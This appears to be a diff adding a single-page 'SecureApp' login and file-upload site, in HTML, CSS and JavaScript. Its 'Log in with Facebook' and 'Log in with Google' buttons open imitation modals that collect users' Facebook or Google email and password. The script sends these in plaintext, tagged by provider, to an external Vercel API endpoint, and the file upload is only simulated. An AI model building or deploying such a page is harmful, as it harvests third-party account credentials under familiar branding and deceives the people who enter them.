@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login System</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            transition: background-color 0.3s;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 1000px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .login-container {
+            display: flex;
+            width: 100%;
+            min-height: 550px;
+        }
+
+        .welcome-section {
+            flex: 1;
+            background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+            color: white;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .welcome-section h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+
+        .welcome-section p {
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        .login-section {
+            flex: 1;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .login-section h2 {
+            color: #1877f2;
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+        }
+
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .login-btn {
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+        }
+
+        .facebook-btn {
+            background-color: #1877f2;
+            color: white;
+        }
+
+        .google-btn {
+            background-color: #ffffff;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+
+        .other-btn {
+            background-color: #42b72a;
+            color: white;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-form {
+            display: none;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .form-group label {
+            font-weight: 500;
+            color: #333;
+        }
+
+        .form-group input {
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+
+        .submit-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background-color: #0d5cb6;
+        }
+
+        .home-container {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            min-height: 600px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+            color: white;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+            font-weight: bold;
+        }
+
+        .logout-btn {
+            background-color: transparent;
+            border: 1px solid white;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .logout-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .content {
+            padding: 40px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+
+        .upload-section {
+            background-color: #f7f8fa;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        .upload-section h2 {
+            color: #1877f2;
+            margin-bottom: 15px;
+        }
+
+        .upload-area {
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+        }
+
+        .upload-area:hover {
+            border-color: #1877f2;
+            background-color: #f0f7ff;
+        }
+
+        .upload-area i {
+            font-size: 3rem;
+            color: #1877f2;
+            margin-bottom: 15px;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .upload-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .upload-btn:hover {
+            background-color: #0d5cb6;
+            transform: translateY(-2px);
+        }
+
+        .upload-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .upload-status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+        }
+
+        .success {
+            background-color: #e7f7e7;
+            color: #2d8a2d;
+            border: 1px solid #c1e6c1;
+        }
+
+        .error {
+            background-color: #fde8e8;
+            color: #c53030;
+            border: 1px solid #f5c6c6;
+        }
+
+        .file-info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f0f7ff;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .file-info h3 {
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+
+        .app-info {
+            background-color: #f7f8fa;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        .app-info h2 {
+            color: #1877f2;
+            margin-bottom: 15px;
+        }
+
+        .app-info p {
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .features {
+            display: flex;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .feature {
+            flex: 1;
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        .feature i {
+            font-size: 2rem;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            animation: modalAppear 0.3s ease-out;
+        }
+
+        @keyframes modalAppear {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #eee;
+        }
+
+        .modal-header h3 {
+            color: #1877f2;
+            font-size: 1.3rem;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #777;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .provider-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .provider-form input {
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+
+        .provider-submit {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .provider-submit:hover {
+            background-color: #0d5cb6;
+        }
+
+        .loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .login-container {
+                flex-direction: column;
+            }
+            
+            .features {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Login Page -->
+        <div class="login-container" id="loginPage">
+            <div class="welcome-section">
+                <h1>Welcome to SecureApp</h1>
+                <p>Connect with friends and the world around you. Share your files and stay connected with our secure platform.</p>
+                <p style="margin-top: 20px;">Join millions of users who trust our platform for their daily needs.</p>
+            </div>
+            <div class="login-section">
+                <h2>Log in to SecureApp</h2>
+                <div class="login-options">
+                    <button class="login-btn facebook-btn" id="facebookLogin">
+                        <i class="fab fa-facebook-f"></i> Log in with Facebook
+                    </button>
+                    <button class="login-btn google-btn" id="googleLogin">
+                        <i class="fab fa-google"></i> Log in with Google
+                    </button>
+                    <button class="login-btn other-btn" id="otherLogin">
+                        <i class="fas fa-user"></i> Log in with Email/Phone
+                    </button>
+                </div>
+                
+                <div class="login-form" id="emailForm">
+                    <div class="form-group">
+                        <label for="email">Email or Phone Number</label>
+                        <input type="text" id="email" placeholder="Enter your email or phone number">
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter your password">
+                    </div>
+                    <button class="submit-btn" id="loginSubmit">Log In</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Home Page -->
+        <div class="home-container" id="homePage">
+            <div class="header">
+                <h1>SecureApp</h1>
+                <div class="user-info">
+                    <div class="avatar" id="userAvatar">U</div>
+                    <span id="userName">User</span>
+                    <button class="logout-btn" id="logoutBtn">Log Out</button>
+                </div>
+            </div>
+            <div class="content">
+                <div class="upload-section">
+                    <h2>Upload Your File</h2>
+                    <p>Select a file to upload. Supported formats: MP3, MP4, JPG, PDF</p>
+                    
+                    <div class="upload-area" id="uploadArea">
+                        <i class="fas fa-cloud-upload-alt"></i>
+                        <h3>Drag & Drop your file here</h3>
+                        <p>or click to browse</p>
+                        <input type="file" id="fileInput" class="file-input" accept=".mp3,.mp4,.jpg,.jpeg,.pdf">
+                    </div>
+                    
+                    <button class="upload-btn" id="uploadBtn" disabled>Upload File</button>
+                    
+                    <div class="upload-status" id="uploadStatus"></div>
+                    
+                    <div class="file-info" id="fileInfo">
+                        <h3>File Information</h3>
+                        <p><strong>File Name:</strong> <span id="fileName">-</span></p>
+                        <p><strong>File Type:</strong> <span id="fileType">-</span></p>
+                        <p><strong>File Size:</strong> <span id="fileSize">-</span></p>
+                        <p><strong>Upload Date:</strong> <span id="uploadDate">-</span></p>
+                    </div>
+                </div>
+                
+                <div class="app-info">
+                    <h2>About SecureApp</h2>
+                    <p>SecureApp is a platform that allows you to securely store and share your files with friends and colleagues. Our advanced security measures ensure your data is always protected.</p>
+                    <p>With support for multiple file types and a user-friendly interface, SecureApp makes file management simple and efficient.</p>
+                    
+                    <div class="features">
+                        <div class="feature">
+                            <i class="fas fa-shield-alt"></i>
+                            <h3>Secure</h3>
+                            <p>Your data is protected with industry-leading security measures.</p>
+                        </div>
+                        <div class="feature">
+                            <i class="fas fa-bolt"></i>
+                            <h3>Fast</h3>
+                            <p>Upload and access your files quickly from anywhere.</p>
+                        </div>
+                        <div class="feature">
+                            <i class="fas fa-users"></i>
+                            <h3>Social</h3>
+                            <p>Connect with friends and share files seamlessly.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Facebook Login Modal -->
+    <div class="modal" id="facebookModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Log in with Facebook</h3>
+                <button class="close-btn" id="closeFacebook">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="provider-form" id="facebookForm">
+                    <input type="email" id="facebookEmail" placeholder="Email or phone number">
+                    <input type="password" id="facebookPassword" placeholder="Password">
+                    <button class="provider-submit" id="facebookSubmit">Log In</button>
+                </div>
+                <div class="loading" id="facebookLoading" style="display: none;">
+                    <div class="spinner"></div>
+                    <p>Connecting to Facebook...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Google Login Modal -->
+    <div class="modal" id="googleModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Log in with Google</h3>
+                <button class="close-btn" id="closeGoogle">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="provider-form" id="googleForm">
+                    <input type="email" id="googleEmail" placeholder="Email or phone number">
+                    <input type="password" id="googlePassword" placeholder="Password">
+                    <button class="provider-submit" id="googleSubmit">Log In</button>
+                </div>
+                <div class="loading" id="googleLoading" style="display: none;">
+                    <div class="spinner"></div>
+                    <p>Connecting to Google...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ADD THESE LINES AT THE VERY TOP of your script section
+        const API_URL = 'https://your-vercel-app-url.vercel.app/api'; // You'll update this after deployment
+        let currentUser = null;
+
+        // ADD THESE FUNCTIONS inside your script, after the DOM elements
+        async function storeUserInDatabase(userData) {
+            try {
+                const response = await fetch(`${API_URL}/users`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(userData)
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Database storage error:', error);
+                // Fallback to localStorage if database fails
+                localStorage.setItem('user', JSON.stringify(userData));
+                return userData;
+            }
+        }
+
+        async function checkUserExists(identifier) {
+            try {
+                const response = await fetch(`${API_URL}/users/${identifier}`);
+                return await response.json();
+            } catch (error) {
+                console.error('Database check error:', error);
+                // Fallback to localStorage
+                const storedUser = localStorage.getItem('user');
+                return storedUser ? JSON.parse(storedUser) : null;
+            }
+        }
+        
+        const loginPage = document.getElementById('loginPage');
+        const homePage = document.getElementById('homePage');
+        const facebookLogin = document.getElementById('facebookLogin');
+        const googleLogin = document.getElementById('googleLogin');
+
+        const otherLogin = document.getElementById('otherLogin');
+        const emailForm = document.getElementById('emailForm');
+        const loginSubmit = document.getElementById('loginSubmit');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const uploadStatus = document.getElementById('uploadStatus');
+        const fileInfo = document.getElementById('fileInfo');
+        const fileName = document.getElementById('fileName');
+        const fileType = document.getElementById('fileType');
+        const fileSize = document.getElementById('fileSize');
+        const uploadDate = document.getElementById('uploadDate');
+        const userAvatar = document.getElementById('userAvatar');
+        const userName = document.getElementById('userName');
+
+        // Modal Elements
+        const facebookModal = document.getElementById('facebookModal');
+        const googleModal = document.getElementById('googleModal');
+        const closeFacebook = document.getElementById('closeFacebook');
+        const closeGoogle = document.getElementById('closeGoogle');
+        const facebookSubmit = document.getElementById('facebookSubmit');
+        const googleSubmit = document.getElementById('googleSubmit');
+        const facebookForm = document.getElementById('facebookForm');
+        const googleForm = document.getElementById('googleForm');
+        const facebookLoading = document.getElementById('facebookLoading');
+        const googleLoading = document.getElementById('googleLoading');
+
+        // Event Listeners
+        facebookLogin.addEventListener('click', () => {
+            facebookModal.style.display = 'flex';
+        });
+
+        googleLogin.addEventListener('click', () => {
+            googleModal.style.display = 'flex';
+        });
+
+        otherLogin.addEventListener('click', () => {
+            emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
+        });
+
+        loginSubmit.addEventListener('click', () => {
+            handleEmailLogin();
+        });
+
+        closeFacebook.addEventListener('click', () => {
+            facebookModal.style.display = 'none';
+        });
+
+        closeGoogle.addEventListener('click', () => {
+            googleModal.style.display = 'none';
+        });
+
+        facebookSubmit.addEventListener('click', () => {
+            handleProviderLogin('facebook');
+        });
+
+        googleSubmit.addEventListener('click', () => {
+            handleProviderLogin('google');
+        });
+
+        logoutBtn.addEventListener('click', () => {
+            loginPage.style.display = 'flex';
+            homePage.style.display = 'none';
+        });
+
+        uploadArea.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', handleFileSelect);
+        uploadBtn.addEventListener('click', handleFileUpload);
+
+        // Close modals when clicking outside
+        window.addEventListener('click', (event) => {
+            if (event.target === facebookModal) {
+                facebookModal.style.display = 'none';
+            }
+            if (event.target === googleModal) {
+                googleModal.style.display = 'none';
+            }
+        });
+
+        // Functions
+        async function handleEmailLogin() {
+            const identifier = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!identifier || !password) {
+                alert('Please enter both email/phone and password');
+                return;
+            }
+            
+            if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
+                alert('Please enter a valid email address or phone number');
+                return;
+            }
+            
+            try {
+                // Check if user exists
+                const existingUser = await checkUserExists(identifier);
+                
+                if (!existingUser) {
+                    // Store new user in database
+                    const userData = {
+                        email: isValidEmail(identifier) ? identifier : null,
+                        phone: isValidPhone(identifier) ? identifier : null,
+                        password: password, // In real app, hash this!
+                        loginMethod: 'email',
+                        createdAt: new Date()
+                    };
+                    currentUser = await storeUserInDatabase(userData);
+                } else {
+                    currentUser = existingUser;
+                }
+                
+                // If validation passes, log the user in
+                userAvatar.textContent = identifier.charAt(0).toUpperCase();
+                userName.textContent = identifier;
+                
+                loginPage.style.display = 'none';
+                homePage.style.display = 'flex';
+                
+            } catch (error) {
+                alert('Login failed. Please try again.');
+            }
+        }
+        async function handleProviderLogin(provider) {
+            let email, password, modal, form, loading;
+            
+            if (provider === 'facebook') {
+                email = document.getElementById('facebookEmail').value;
+                password = document.getElementById('facebookPassword').value;
+                modal = facebookModal;
+                form = facebookForm;
+                loading = facebookLoading;
+            } else {
+                email = document.getElementById('googleEmail').value;
+                password = document.getElementById('googlePassword').value;
+                modal = googleModal;
+                form = googleForm;
+                loading = googleLoading;
+            }
+            
+            if (!email || !password) {
+                alert('Please enter both email and password');
+                return;
+            }
+            
+            // Show loading state
+            form.style.display = 'none';
+            loading.style.display = 'flex';
+            
+            try {
+                // Check if user exists
+                const existingUser = await checkUserExists(email);
+                
+                if (!existingUser) {
+                    // Store new user in database
+                    const userData = {
+                        email: email,
+                        password: password, // In real app, hash this!
+                        loginMethod: provider,
+                        createdAt: new Date()
+                    };
+                    currentUser = await storeUserInDatabase(userData);
+                } else {
+                    currentUser = existingUser;
+                }
+                
+                // Update UI
+                userAvatar.textContent = provider.charAt(0).toUpperCase();
+                userName.textContent = `${provider} User (${email})`;
+                
+                loginPage.style.display = 'none';
+                homePage.style.display = 'flex';
+                modal.style.display = 'none';
+                
+            } catch (error) {
+                alert('Login failed. Please try again.');
+            } finally {
+                // Reset forms
+                form.style.display = 'flex';
+                loading.style.display = 'none';
+                document.getElementById('facebookEmail').value = '';
+                document.getElementById('facebookPassword').value = '';
+                document.getElementById('googleEmail').value = '';
+                document.getElementById('googlePassword').value = '';
+            }
+        }
+            
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function isValidPhone(phone) {
+            const phoneRegex = /^0\d{9}$/;
+            return phoneRegex.test(phone);
+        }
+
+        function handleFileSelect(event) {
+            const file = event.target.files[0];
+            
+            if (file) {
+                // Check file type
+                const fileExtension = file.name.split('.').pop().toLowerCase();
+                const allowedExtensions = ['mp3', 'mp4', 'jpg', 'jpeg', 'pdf'];
+                
+                if (!allowedExtensions.includes(fileExtension)) {
+                    uploadStatus.textContent = 'Error: Only MP3, MP4, JPG, and PDF files are allowed.';
+                    uploadStatus.className = 'upload-status error';
+                    uploadStatus.style.display = 'block';
+                    uploadBtn.disabled = true;
+                    return;
+                }
+                
+                // Enable upload button
+                uploadBtn.disabled = false;
+                
+                // Display file info
+                fileName.textContent = file.name;
+                fileType.textContent = fileExtension.toUpperCase();
+                fileSize.textContent = formatFileSize(file.size);
+                uploadDate.textContent = new Date().toLocaleDateString();
+                
+                fileInfo.style.display = 'block';
+            }
+        }
+
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        function handleFileUpload() {
+            // Simulate upload process
+            uploadBtn.disabled = true;
+            uploadBtn.textContent = 'Uploading...';
+            
+            setTimeout(() => {
+                uploadStatus.textContent = 'Thank you for using our app! Your file has been uploaded successfully.';
+                uploadStatus.className = 'upload-status success';
+                uploadStatus.style.display = 'block';
+                
+                uploadBtn.textContent = 'Upload Complete';
+                
+                // Reset after 5 seconds
+                setTimeout(() => {
+                    uploadBtn.disabled = true;
+                    uploadBtn.textContent = 'Upload File';
+                    fileInput.value = '';
+                    fileInfo.style.display = 'none';
+                    uploadStatus.style.display = 'none';
+                }, 5000);
+            }, 2000);
+        }
+        // Check if user is already logged in (add this at the end of your script)
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                // Try to get user from localStorage as fallback
+                const storedUser = localStorage.getItem('user');
+                if (storedUser) {
+                    currentUser = JSON.parse(storedUser);
+                    userAvatar.textContent = (currentUser.email || currentUser.phone).charAt(0).toUpperCase();
+                    userName.textContent = currentUser.email || currentUser.phone;
+                    loginPage.style.display = 'none';
+                    homePage.style.display = 'flex';
+                }
+            } catch (error) {
+                console.log('No stored user found');
+            }
+        });
+    </script>
+</body>
+</html>
